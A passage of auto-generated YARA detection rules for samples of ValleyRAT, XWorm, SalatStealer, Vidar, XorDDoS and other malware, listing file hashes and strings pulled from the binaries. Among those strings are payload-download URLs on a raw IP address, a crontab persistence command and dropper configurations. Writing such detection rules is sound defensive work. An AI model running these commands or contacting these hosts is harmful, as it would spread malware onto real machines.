      $s5 = "* P-M+" fullword ascii /* score: '9.00'*/
      $s6 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
      $s7 = ".guK* d" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash__0254a41d {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash)_0254a41d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0254a41dbf2fa22e2089a469e0df44ff829387a6ae5c2f3b9911e2367f47fef4"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "~|}335;:d" fullword ascii /* score: '9.00'*/ /* hex encoded string '3]' */
      $s6 = "+ -)qXv;Ya" fullword ascii /* score: '9.00'*/
      $s7 = "JgET(tQ" fullword ascii /* score: '9.00'*/
      $s8 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule ValleyRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0bc82bb26cb3d406af76d32000082138a09381c2bd2c26039590f694fba5fb18"
   strings:
      $s1 = "http://43.225.47.216:5513/tpsvcBase.dll" fullword wide /* score: '28.00'*/
      $s2 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s3 = "http://43.225.47.216:5513/TPSvc.exe" fullword wide /* score: '27.00'*/
      $s4 = "tpsvcBase.dll" fullword wide /* score: '23.00'*/
      $s5 = "RwozeECDRk.exe" fullword wide /* score: '22.00'*/
      $s6 = "http://43.225.47.216:5513/15.ini" fullword wide /* score: '15.00'*/
      $s7 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s8 = "[System] Delay completed. Actual waited: " fullword ascii /* score: '10.00'*/
      $s9 = "C:\\Windows\\SysWOW64\\yyk\\" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Stealc_signature__da81261259e99bfaae1a58c0222953dc_imphash_ {
   meta:
      description = "_subset_batch - file Stealc(signature)_da81261259e99bfaae1a58c0222953dc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc5b2bf704b333bad115a0c656c065ae8b04eb15999e6f1e3c1ea9368b00b150"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule Vidar_signature__da81261259e99bfaae1a58c0222953dc_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_da81261259e99bfaae1a58c0222953dc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b51faaf89ca817bb943abf2b161537106eeaf0b1f0114b406c5c9ab9a4ce1f66"
   strings:
      $s1 = "bKERNEL32.DLL" fullword wide /* score: '23.00'*/
      $s2 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__12d62d40 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_12d62d40.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "12d62d40ab342d697ddde068595d6c8d04f6208a4ce75b0776275c09415a1ff1"
   strings:
      $s1 = "m5ZqAc:\"" fullword ascii /* score: '10.00'*/
      $s2 = "wrqsvjq" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__1bfd6286 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_1bfd6286.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1bfd6286fd0a54a5036984b8a43cce66c786cfa350b2aa0fada8ac6a3e7e5b7e"
   strings:
      $s1 = "* D-sFVyMk}^" fullword ascii /* score: '12.00'*/
      $s2 = ":IrCV~$S" fullword ascii /* score: '9.00'*/
      $s3 = "V@gJ+ -!Kf" fullword ascii /* score: '9.00'*/
      $s4 = "\\T9t:\\h" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__24c820fb {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_24c820fb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "24c820fbf7376c4db374ba3e5267ee6eb2e9c03b31ce1b77528bc67451be0833"
   strings:
      $s1 = "giTDlL5C" fullword ascii /* score: '9.00'*/
      $s2 = "* <#R_C" fullword ascii /* score: '9.00'*/
      $s3 = "qzpjhbpm" fullword ascii /* score: '8.00'*/
      $s4 = "D-%D%k" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__463d6d0e {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_463d6d0e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "463d6d0e362d78e3664ce4a8dce86d59aa2a38a22efdb962c081a06014667c4a"
   strings:
      $s1 = "JepU:\\*" fullword ascii /* score: '10.00'*/
      $s2 = "* v/0h" fullword ascii /* score: '9.00'*/
      $s3 = "ELogu>f" fullword ascii /* score: '9.00'*/
      $s4 = "FfUVm* ?" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__62217b4f {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_62217b4f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "62217b4faf6adcd101710f91141e63102924c9e9ac1c86e5ebba3451ce9e6779"
   strings:
      $s1 = "q.cFG$U" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__d765dc53 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_d765dc53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d765dc532eaf11ab95e4b67acccbc0679b860e6347339668d24cf8653004fbbd"
   strings:
      $s1 = "* o&YL" fullword ascii /* score: '9.00'*/
      $s2 = "/iGET\\i@" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Sality_signature__24684c1807b1d3b6de46cba950d010d5_imphash_ {
   meta:
      description = "_subset_batch - file Sality(signature)_24684c1807b1d3b6de46cba950d010d5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce6102a9f4d29bf39d2667c4f81a0d4c735df47eeaca2c01e5294ec9a0b26e94"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '39.00'*/
      $x2 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $s3 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s4 = "ity>        <requestedPrivileges>            <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>       " ascii /* score: '14.00'*/
      $s5 = "muPlJ.OgS" fullword ascii /* score: '10.00'*/
      $s6 = "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__6736cd3f {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_6736cd3f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6736cd3f0b4932dfe5d8db76e2c68a054c1497a6b305b8357d3d9bc0ca803379"
   strings:
      $s1 = "tGFP0cj\\T" fullword ascii /* score: '9.00'*/
      $s2 = "* }Hd!" fullword ascii /* score: '9.00'*/
      $s3 = "V{Z/H* /D~!w$" fullword ascii /* score: '9.00'*/
      $s4 = "usiprsj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__9e099f69 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_9e099f69.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9e099f69bea098fd4348f07a68d5463d87df5ecffcce55f8cde02683f6f82ea9"
   strings:
      $s1 = "\"\\60\"|" fullword ascii /* score: '9.00'*/ /* hex encoded string '`' */
      $s2 = "ZOXs_%p%*TB" fullword ascii /* score: '8.00'*/
      $s3 = "&R%m%eKXuao>~n" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__b63d1e22 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_b63d1e22.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b63d1e22ae671b23b4e88a471f41d041e6b51235151460a00146319f1aa9cac0"
   strings:
      $s1 = "NZASu:\\" fullword ascii /* score: '10.00'*/
      $s2 = "* Jf'Lj" fullword ascii /* score: '9.00'*/
      $s3 = "- .Bfo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule SalatStealer_signature__6ed4f5f04d62b18d96b26d6db7c18840_imphash__cbb9547d {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_6ed4f5f04d62b18d96b26d6db7c18840(imphash)_cbb9547d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cbb9547d9525f52f544202a9568b7aef830ec2565ec4eff9527715b5da5c917c"
   strings:
      $s1 = "* !VD\\" fullword ascii /* score: '9.00'*/
      $s2 = "4|a\\\"2b" fullword ascii /* score: '9.00'*/ /* hex encoded string 'J+' */
      $s3 = "* {'QY" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule XWorm_signature__c9adc83b45e363b21cd6b11b5da0501f_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_c9adc83b45e363b21cd6b11b5da0501f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9a417472ef2316714ebc9699deb3199447784714a4dcd15302eac4fb762b74f3"
   strings:
      $s1 = "Execute the commands..." fullword ascii /* score: '21.00'*/
      $s2 = "mailto:support@company.com" fullword ascii /* score: '21.00'*/
      $s3 = "@$&%01\\winreye.exe" fullword ascii /* score: '20.00'*/
      $s4 = "  <description>Smart Install Maker - create setup software</description>" fullword ascii /* score: '18.00'*/
      $s5 = "http://www.company.com/" fullword ascii /* score: '17.00'*/
      $s6 = "This setup requires the .NET Framework version 1.1+. Please install the .NET Framework and run this setup again." fullword ascii /* score: '16.00'*/
      $s7 = "@$&%04\\Uninstall.exe" fullword ascii /* score: '15.00'*/
      $s8 = "Enter the password" fullword ascii /* score: '12.00'*/
      $s9 = "A password is required to begin the installation of NewProduct. Type the password and then click \"Next\"." fullword ascii /* score: '12.00'*/
      $s10 = "This setup is password protected." fullword ascii /* score: '12.00'*/
      $s11 = "Installation password" fullword ascii /* score: '12.00'*/
      $s12 = " inflate 1.1.4 Copyright 1995-2002 Mark Adler " fullword ascii /* PEStudio Blacklist: strings */ /* score: '11.00'*/
      $s13 = "        <requestedExecutionLevel level=\"requireAdministrator\"/>" fullword ascii /* score: '11.00'*/
      $s14 = "    processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s15 = "Setup is now ready to begin installing NewProduct on your computer." fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule SalatStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6f99cc9a {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6f99cc9a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6f99cc9a335d32f1ac7e75627df25bf7efda71ce923a48911aa480617b6fe2bd"
   strings:
      $s1 = "XBinderOutput.exe" fullword wide /* score: '25.00'*/
      $s2 = "Xeno.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s3 = "Xeno.exe" fullword wide /* score: '22.00'*/
      $s4 = "Xeno1.2.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '22.00'*/
      $s5 = "Xeno1.2.exe" fullword wide /* score: '19.00'*/
      $s6 = "* -7-gR" fullword ascii /* score: '13.00'*/
      $s7 = "GetTheResource" fullword ascii /* score: '9.00'*/
      $s8 = ":3*#+\\c*" fullword ascii /* score: '9.00'*/ /* hex encoded string '<' */
      $s9 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule VIPKeylogger_signature__ced282d9b261d1462772017fe2f6972b_imphash_ {
   meta:
      description = "_subset_batch - file VIPKeylogger(signature)_ced282d9b261d1462772017fe2f6972b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "61b825edb3a3fcffa07df1f9e5d8bf2a0243b2e90fbb2a7fa74caf1c215bcc3a"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s3 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s4 = "7533222200" ascii /* score: '17.00'*/ /* hex encoded string 'u3""' */
      $s5 = "202223333577" ascii /* score: '17.00'*/ /* hex encoded string ' "#35w' */
      $s6 = "7523222000" ascii /* score: '17.00'*/ /* hex encoded string 'u#" ' */
      $s7 = "233333335555755320" ascii /* score: '17.00'*/ /* hex encoded string '#333UUuS ' */
      $s8 = "3535557757775432" ascii /* score: '17.00'*/ /* hex encoded string '55UwWwT2' */
      $s9 = "353555775777543200" ascii /* score: '17.00'*/ /* hex encoded string '55UwWwT2' */
      $s10 = "796979777777" ascii /* score: '17.00'*/ /* hex encoded string 'yiywww' */
      $s11 = "22222223333555555575757755" ascii /* score: '17.00'*/ /* hex encoded string '"""#35UUUuuwU' */
      $s12 = "EDDDDDDDDD" ascii /* reversed goodware string 'DDDDDDDDDE' */ /* score: '16.50'*/
      $s13 = "cccZbbb" fullword ascii /* reversed goodware string 'bbbZccc' */ /* score: '14.00'*/
      $s14 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s15 = "!$%(0:?BDEGGIIIKKKKIIE?;9520**(&$$#!#%,157:77530(&$!!!" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73cbd3c02714abe93aae9e08401d86b04a10671a4514331e516f7f5c483c3e73"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\ZoviwEKhkB\\src\\obj\\Debug\\eRBO.pdb" fullword ascii /* score: '40.00'*/
      $x2 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutra" ascii /* score: '31.00'*/
      $s3 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '28.00'*/
      $s4 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '28.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADd" fullword ascii /* score: '27.00'*/
      $s6 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '25.00'*/
      $s7 = "eRBO.exe" fullword wide /* score: '22.00'*/
      $s8 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '19.00'*/
      $s9 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutra" ascii /* score: '19.00'*/
      $s10 = "http://tempuri.org/MembershipDataSet.xsd" fullword wide /* score: '17.00'*/
      $s11 = "l, PublicKeyToken=b03f5f7f11d50a3a\"System.Drawing.Design.UITypeEditor" fullword ascii /* score: '16.00'*/
      $s12 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s13 = "get_DescriptionColumn" fullword ascii /* score: '15.00'*/
      $s14 = "get_CityGymLogo" fullword ascii /* score: '14.00'*/
      $s15 = "get_AddressColumn" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule XorDDoS_signature_ {
   meta:
      description = "_subset_batch - file XorDDoS(signature).elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0007aa8a69792a6e7fab0cf3078897810ce61a1d15bfdc98509c6aa7b1e99fbc"
   strings:
      $s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)" fullword ascii /* score: '23.00'*/
      $s2 = "sed -i '/\\/etc\\/cron.hourly\\/gcc.sh/d' /etc/crontab && echo '*/3 * * * * root /etc/cron.hourly/gcc.sh' >> /etc/crontab" fullword ascii /* score: '22.00'*/
      $s3 = "?33333333" fullword ascii /* reversed goodware string '33333333?' */ /* score: '19.00'*/ /* hex encoded string '3333' */
      $s4 = "relocation processing: %s%s" fullword ascii /* score: '18.00'*/
      $s5 = "*** glibc detected *** %s: %s: 0x%s ***" fullword ascii /* score: '17.50'*/
      $s6 = "/usr/libexec/getconf" fullword ascii /* score: '17.00'*/
      $s7 = "*** stack smashing detected ***: %s terminated" fullword ascii /* score: '15.00'*/
      $s8 = "ELF load command address/offset not properly aligned" fullword ascii /* score: '15.00'*/
      $s9 = "invalid target namespace in dlmopen()" fullword ascii /* score: '14.00'*/
      $s10 = "# description: %s" fullword ascii /* score: '14.00'*/
      $s11 = "# Short-Description:" fullword ascii /* score: '14.00'*/
      $s12 = "DYNAMIC LINKER BUG!!!" fullword ascii /* score: '13.00'*/
      $s13 = "TLS generation counter wrapped!  Please report as described in <http://www.gnu.org/software/libc/bugs.html>." fullword ascii /* score: '13.00'*/
      $s14 = "symbol=%s;  lookup in file=%s [%lu]" fullword ascii /* score: '12.50'*/
      $s15 = "%s: Symbol `%s' has different size in shared object, consider re-linking" fullword ascii /* score: '12.50'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      8 of them
}

rule SalatStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0acd38d5 {
   meta:
      description = "_subset_batch - file SalatStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0acd38d5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0acd38d5a035fba9c1696ff905efb055c87ed33a185edf7b1a37daabf627f810"
   strings:
      $s1 = "swav2.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s2 = "SWAInstaller.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s3 = "SWAOutput.exe" fullword wide /* score: '22.00'*/
      $s4 = "SWAInstaller.exe" fullword wide /* score: '22.00'*/
      $s5 = "swav2.exe" fullword wide /* score: '22.00'*/
      $s6 = "ZGrP.ySf" fullword ascii /* score: '10.00'*/
      $s7 = "RhNc.PUA" fullword ascii /* score: '10.00'*/
      $s8 = "%!eXec" fullword ascii /* score: '9.00'*/
      $s9 = "GetTheResource" fullword ascii /* score: '9.00'*/
      $s10 = "* M)kRM" fullword ascii /* score: '9.00'*/
      $s11 = "?XDLLHDD" fullword ascii /* score: '9.00'*/
      $s12 = "+#2d}@_\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '-' */
      $s13 = "txeejkjdwehilch" fullword wide /* score: '8.00'*/
      $s14 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2da4e452 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2da4e452.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2da4e452aef9094897e8face35805010b092d05049cde895b0fa0a679290605e"
   strings:
      $s1 = "Microsoft Windows Search protocol Host.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '27.00'*/
      $s2 = "miner.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s3 = "Realtek HD Audio Universal Service.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '25.00'*/
      $s4 = "Microsoft Windows Search protocol Host.exe" fullword wide /* score: '24.00'*/
      $s5 = "Realtek HD Audio Universal Service.exe" fullword wide /* score: '22.00'*/
      $s6 = "miner.exe" fullword wide /* score: '22.00'*/
      $s7 = "FREE NEW PANEL.exe|True|False|False|%Temp%|False|False|False" fullword wide /* score: '22.00'*/
      $s8 = "FREE NEW PANEL.exe" fullword wide /* score: '19.00'*/
      $s9 = "}_xtVN:\\x" fullword ascii /* score: '10.00'*/
      $s10 = "MiEi.RMx" fullword ascii /* score: '10.00'*/
      $s11 = "GetTheResource" fullword ascii /* score: '9.00'*/
      $s12 = "* 7=O$" fullword ascii /* score: '9.00'*/
      $s13 = "ZL* -`" fullword ascii /* score: '9.00'*/
      $s14 = "* 4yHT" fullword ascii /* score: '9.00'*/
      $s15 = "eFvUWgeT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__65327df4 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_65327df4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "65327df43dc0bcef73f3b04c061764bd6fd8c856fc6a469540d0e4e0100236ae"
   strings:
      $s1 = "rat.exe" fullword wide /* score: '24.00'*/
      $s2 = "Vatality-Fortnite.exe" fullword wide /* score: '19.00'*/
      $s3 = "rat.exe-=>True-=>False" fullword wide /* score: '19.00'*/
      $s4 = "Vatality-Fortnite.exe-=>True-=>False" fullword wide /* score: '11.00'*/
      $s5 = "TeMc.bYP?_" fullword ascii /* score: '10.00'*/
      $s6 = "uuANSpY+" fullword ascii /* score: '9.00'*/
      $s7 = "* ;ByC^:" fullword ascii /* score: '9.00'*/
      $s8 = "0w8VbRyNXOaE3EBE0NIbn5CgetlQWt7aPh3V71257" fullword ascii /* score: '9.00'*/
      $s9 = "* o=c<" fullword ascii /* score: '9.00'*/
      $s10 = "%Current%" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7ffa3011 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7ffa3011.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7ffa3011fcb679f93ad497805584a5808ad224091b74f774b46e41fb337bdd4e"
   strings:
      $s1 = "AutoHotkey_1.1.3.02_setup.exe" fullword wide /* score: '22.00'*/
      $s2 = "%38##&4?e" fullword ascii /* score: '9.00'*/ /* hex encoded string '8N' */
      $s3 = "* LDSH" fullword ascii /* score: '9.00'*/
      $s4 = "C-(SoeA -VP" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__532c57c4 {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_532c57c4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "532c57c4d5144601ccd885a1e5b6196c9a3e47573b971b636769c8c7460ce4a6"
   strings:
      $s1 = "\"/<\"]5B" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s2 = "6<\"d7B\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'm{' */
      $s3 = "* Uy*>I" fullword ascii /* score: '9.00'*/
      $s4 = "cdefghij" fullword ascii /* score: '8.00'*/
      $s5 = "pmbtaykd" fullword ascii /* score: '8.00'*/
      $s6 = "qXaE+ JNH" fullword ascii /* score: '8.00'*/
      $s7 = "wockeegj" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule Vidar_signature__2eabe9054cad5152567f0699947a2c5b_imphash__94c3f424 {
   meta:
      description = "_subset_batch - file Vidar(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_94c3f424.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "94c3f4248aac31b2c6faa886d0758689782348687a656fe2bf55096100943b7f"
   strings:
      $s1 = "Z2lwViZwS" fullword ascii /* base64 encoded string 'gipV&p' */ /* score: '14.00'*/
      $s2 = "ogetNtmzT" fullword ascii /* score: '9.00'*/
      $s3 = "nopqrstu" fullword ascii /* score: '8.00'*/
      $s4 = "fghijklm" fullword ascii /* score: '8.00'*/
      $s5 = "fnhhcgkh" fullword ascii /* score: '8.00'*/
      $s6 = "zqrjdegb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      all of them
}

rule ValleyRAT_signature__c38362e0e37590c08f252fc98b1f0136_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_c38362e0e37590c08f252fc98b1f0136(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f0f0105e5c73ea1fbf14a9da56c31831fbacd941043e4f79c46610d00f638c4"
   strings:
      $s1 = "hsthsths.exe" fullword wide /* score: '22.00'*/
      $s2 = "processorArchitecture='X86'" fullword ascii /* score: '15.00'*/
      $s3 = "processorArchitecture='*'" fullword ascii /* score: '15.00'*/
      $s4 = "publicKeyToken='6595b64144ccf1df'" fullword ascii /* score: '13.00'*/
